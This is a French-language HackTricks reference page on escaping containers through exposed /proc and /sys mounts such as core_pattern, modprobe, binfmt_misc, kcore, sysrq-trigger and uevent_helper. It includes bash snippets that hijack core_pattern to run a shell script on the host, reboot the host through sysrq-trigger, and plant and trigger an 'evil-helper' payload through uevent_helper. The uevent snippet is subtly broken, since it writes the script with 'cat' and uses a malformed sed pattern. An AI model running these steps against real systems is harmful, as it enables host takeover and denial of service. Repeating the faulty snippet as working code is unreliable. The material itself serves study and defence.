<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


(_**Ces informations proviennent de**_ [_**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**_](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts))

En raison du manque de support de l'espace de noms, l'exposition de `/proc` et `/sys` offre une surface d'attaque significative et une divulgation d'informations. De nombreux fichiers dans `procfs` et `sysfs` présentent un risque d'évasion de conteneur, de modification de l'hôte ou de divulgation d'informations de base qui pourraient faciliter d'autres attaques.

Pour abuser de ces techniques, il pourrait suffire de **mal configurer quelque chose comme `-v /proc:/host/proc`** car AppArmor ne protège pas `/host/proc` parce que **AppArmor est basé sur le chemin**

# procfs

## /proc/sys

`/proc/sys` permet généralement d'accéder et de modifier les variables du noyau, souvent contrôlées par `sysctl(2)`.

### /proc/sys/kernel/core\_pattern

[/proc/sys/kernel/core\_pattern](https://man7.org/linux/man-pages/man5/core.5.html) définit un programme qui est exécuté lors de la génération d'un fichier core (typiquement un crash de programme) et qui reçoit le fichier core en entrée standard si le premier caractère de ce fichier est un symbole de pipe `|`. Ce programme est exécuté par l'utilisateur root et permet jusqu'à 128 octets d'arguments de ligne de commande. Cela permettrait une exécution de code triviale au sein de l'hôte du conteneur étant donné n'importe quel crash et génération de fichier core (qui peut être simplement ignoré lors d'une myriade d'actions malveillantes).
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes #For testing
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern
sleep 5 && ./crash &
```
### /proc/sys/kernel/modprobe

[/proc/sys/kernel/modprobe](https://man7.org/linux/man-pages/man5/proc.5.html) contient le chemin vers le chargeur de module du noyau, qui est appelé lors du chargement d'un module du noyau, comme via la commande [modprobe](https://man7.org/linux/man-pages/man8/modprobe.8.html). L'exécution de code peut être obtenue en effectuant une action qui déclenchera le noyau à tenter de charger un module du noyau (comme utiliser l'API crypto pour charger un module crypto actuellement non chargé, ou utiliser ifconfig pour charger un module réseau pour un dispositif actuellement non utilisé).
```bash
# Check if you can directly access modprobe
ls -l `cat /proc/sys/kernel/modprobe`
```
### /proc/sys/vm/panic_on_oom

[/proc/sys/vm/panic_on_oom](https://man7.org/linux/man-pages/man5/proc.5.html) est un indicateur global qui détermine si le noyau va paniquer lorsqu'une condition de manque de mémoire (OOM) est atteinte (plutôt que d'invoquer le tueur OOM). Cela relève plus d'une attaque de déni de service (DoS) que d'une évasion de conteneur, mais cela expose néanmoins une capacité qui ne devrait être disponible que pour l'hôte.

### /proc/sys/fs

Le répertoire [/proc/sys/fs](https://man7.org/linux/man-pages/man5/proc.5.html) contient un éventail d'options et d'informations concernant divers aspects du système de fichiers, y compris les quotas, les handles de fichiers, les inodes et les dentries. Un accès en écriture à ce répertoire permettrait diverses attaques de déni de service contre l'hôte.

### /proc/sys/fs/binfmt_misc

[/proc/sys/fs/binfmt_misc](https://man7.org/linux/man-pages/man5/proc.5.html) permet d'exécuter des formats binaires divers, ce qui signifie généralement que divers **interprètes peuvent être enregistrés pour des formats binaires non natifs** (comme Java) en fonction de leur nombre magique. Vous pouvez faire exécuter un binaire en l'enregistrant comme gestionnaires.\
Vous pouvez trouver une exploitation sur [https://github.com/toffan/binfmt_misc](https://github.com/toffan/binfmt_misc) : _Rootkit du pauvre, exploiter l'option_ [_credentials_](https://github.com/torvalds/linux/blame/3bdb5971ffc6e87362787c770353eb3e54b7af30/Documentation/binfmt_misc.txt#L62) _de_ [_binfmt_misc_](https://github.com/torvalds/linux/raw/master/Documentation/admin-guide/binfmt-misc.rst) _pour escalader les privilèges via n'importe quel binaire suid (et obtenir un shell root) si `/proc/sys/fs/binfmt_misc/register` est accessible en écriture._

Pour une explication plus approfondie de cette technique, consultez [https://www.youtube.com/watch?v=WBC7hhgMvQQ](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

## /proc/config.gz

Selon les paramètres `CONFIG_IKCONFIG_PROC`, [/proc/config.gz](https://man7.org/linux/man-pages/man5/proc.5.html) expose une version compressée des options de configuration du noyau pour le noyau en cours d'exécution. Cela peut permettre à un conteneur compromis ou malveillant de découvrir facilement et de cibler les zones vulnérables activées dans le noyau.

## /proc/sysrq-trigger

`Sysrq` est un ancien mécanisme qui peut être invoqué via une combinaison spéciale de touches `SysRq`. Cela peut permettre un redémarrage immédiat du système, l'émission de `sync(2)`, le remontage de tous les systèmes de fichiers en lecture seule, l'invocation de débogueurs du noyau et d'autres opérations.

Si l'invité n'est pas correctement isolé, il peut déclencher les commandes [sysrq](https://www.kernel.org/doc/html/v4.11/admin-guide/sysrq.html) en écrivant des caractères dans le fichier `/proc/sysrq-trigger`.
```bash
# Reboot the host
echo b > /proc/sysrq-trigger
```
## /proc/kmsg

[/proc/kmsg](https://man7.org/linux/man-pages/man5/proc.5.html) peut exposer les messages du tampon circulaire du noyau généralement accessibles via `dmesg`. L'exposition de ces informations peut aider dans le développement d'exploits du noyau, déclencher des fuites d'adresses du noyau (qui pourraient être utilisées pour aider à vaincre la Randomisation de la Disposition de l'Espace d'Adressage du noyau (KASLR)), et être une source de divulgation d'informations générales sur le noyau, le matériel, les paquets bloqués et d'autres détails du système.

## /proc/kallsyms

[/proc/kallsyms](https://man7.org/linux/man-pages/man5/proc.5.html) contient une liste des symboles exportés par le noyau et leurs emplacements pour les modules dynamiques et chargeables. Cela inclut également l'emplacement de l'image du noyau en mémoire physique, ce qui est utile pour le développement d'exploits du noyau. À partir de ces emplacements, l'adresse de base ou le décalage du noyau peut être localisé, ce qui peut être utilisé pour surmonter la Randomisation de la Disposition de l'Espace d'Adressage du noyau (KASLR).

Pour les systèmes avec `kptr_restrict` réglé sur `1` ou `2`, ce fichier existera mais ne fournira aucune information d'adresse (bien que l'ordre dans lequel les symboles sont listés soit identique à l'ordre en mémoire).

## /proc/\[pid]/mem

[/proc/\[pid\]/mem](https://man7.org/linux/man-pages/man5/proc.5.html) expose des interfaces au périphérique de mémoire du noyau `/dev/mem`. Bien que l'Espace de Noms PID puisse protéger contre certaines attaques via ce vecteur `procfs`, cette zone a été historiquement vulnérable, puis considérée comme sûre et à nouveau trouvée [vulnérable](https://git.zx2c4.com/CVE-2012-0056/about/) pour l'escalade de privilèges.

## /proc/kcore

[/proc/kcore](https://man7.org/linux/man-pages/man5/proc.5.html) représente la mémoire physique du système et est au format ELF core (typiquement trouvé dans les fichiers de vidage de mémoire). Il ne permet pas d'écrire dans cette mémoire. La capacité de lire ce fichier (restreinte aux utilisateurs privilégiés) peut divulguer le contenu de la mémoire de l'hôte et d'autres conteneurs.

La grande taille de fichier signalée représente la quantité maximale de mémoire physiquement adressable pour l'architecture, et peut causer des problèmes lors de sa lecture (ou des plantages selon la fragilité du logiciel).

[Dumping /proc/kcore en 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)

## /proc/kmem

`/proc/kmem` est une interface alternative pour [/dev/kmem](https://man7.org/linux/man-pages/man4/kmem.4.html) (l'accès direct à celui-ci est bloqué par la liste blanche des périphériques cgroup), qui est un fichier de périphérique de caractère représentant la mémoire virtuelle du noyau. Il permet la lecture et l'écriture, autorisant la modification directe de la mémoire du noyau.

## /proc/mem

`/proc/mem` est une interface alternative pour [/dev/mem](https://man7.org/linux/man-pages/man4/kmem.4.html) (l'accès direct à celui-ci est bloqué par la liste blanche des périphériques cgroup), qui est un fichier de périphérique de caractère représentant la mémoire physique du système. Il permet la lecture et l'écriture, autorisant la modification de toute la mémoire. (Cela nécessite un peu plus de finesse que `kmem`, car les adresses virtuelles doivent d'abord être résolues en adresses physiques).

## /proc/sched\_debug

`/proc/sched_debug` est un fichier spécial qui retourne des informations sur l'ordonnancement des processus pour l'ensemble du système. Ces informations incluent les noms des processus et les identifiants des processus de tous les espaces de noms en plus des identifiants de cgroup des processus. Cela contourne effectivement les protections de l'Espace de Noms PID et est lisible par d'autres/utilisateurs du monde, donc il peut être exploité dans des conteneurs non privilégiés également.

## /proc/\[pid]/mountinfo

[/proc/\[pid\]/mountinfo](https://man7.org/linux/man-pages/man5/proc.5.html) contient des informations sur les points de montage dans l'espace de noms de montage du processus. Il expose l'emplacement du `rootfs` du conteneur ou de l'image.

# sysfs

## /sys/kernel/uevent\_helper

Les `uevents` sont des événements déclenchés par le noyau lorsqu'un périphérique est ajouté ou retiré. Notamment, le chemin pour le `uevent_helper` peut être modifié en écrivant dans `/sys/kernel/uevent_helper`. Ensuite, lorsqu'un `uevent` est déclenché (ce qui peut également être fait depuis l'espace utilisateur en écrivant dans des fichiers tels que `/sys/class/mem/null/uevent`), le `uevent_helper` malveillant est exécuté.
```bash
# Creates a payload
cat "#!/bin/sh" > /evil-helper
cat "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets uevent_helper to /path/payload
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Triggers a uevent
echo change > /sys/class/mem/null/uevent
# or else
# echo /sbin/poweroff > /sys/kernel/uevent_helper
# Reads the output
cat /output
```
## /sys/class/thermal

Accès à l'ACPI et à divers paramètres matériels pour le contrôle de la température, généralement trouvés dans les ordinateurs portables ou les cartes mères de jeux. Cela peut permettre des attaques par déni de service contre l'hôte du conteneur, pouvant même entraîner des dommages physiques.

## /sys/kernel/vmcoreinfo

Ce fichier peut divulguer des adresses du noyau qui pourraient être utilisées pour défaire le KASLR.

## /sys/kernel/security

Dans `/sys/kernel/security` est montée l'interface `securityfs`, qui permet la configuration des modules de sécurité Linux. Cela permet la configuration des [politiques AppArmor](https://gitlab.com/apparmor/apparmor/-/wikis/Kernel\_interfaces#securityfs-syskernelsecurityapparmor), et donc l'accès à cela peut permettre à un conteneur de désactiver son système MAC.

## /sys/firmware/efi/vars

`/sys/firmware/efi/vars` expose des interfaces pour interagir avec les variables EFI dans la NVRAM. Bien que cela ne soit généralement pas pertinent pour la plupart des serveurs, l'EFI devient de plus en plus populaire. Des faiblesses de permission ont même conduit à des ordinateurs portables briqués.

## /sys/firmware/efi/efivars

`/sys/firmware/efi/efivars` fournit une interface pour écrire dans la NVRAM utilisée pour les arguments de démarrage UEFI. Les modifier peut rendre la machine hôte inamorçable.

## /sys/kernel/debug

`debugfs` fournit une interface "sans règles" par laquelle le noyau (ou les modules du noyau) peut créer des interfaces de débogage accessibles à l'espace utilisateur. Il a eu un certain nombre de problèmes de sécurité dans le passé, et les directives "sans règles" derrière le système de fichiers ont souvent été en conflit avec les contraintes de sécurité.

# Références

* [Comprendre et renforcer la sécurité des conteneurs Linux](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abuser des conteneurs Linux privilégiés et non privilégiés](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
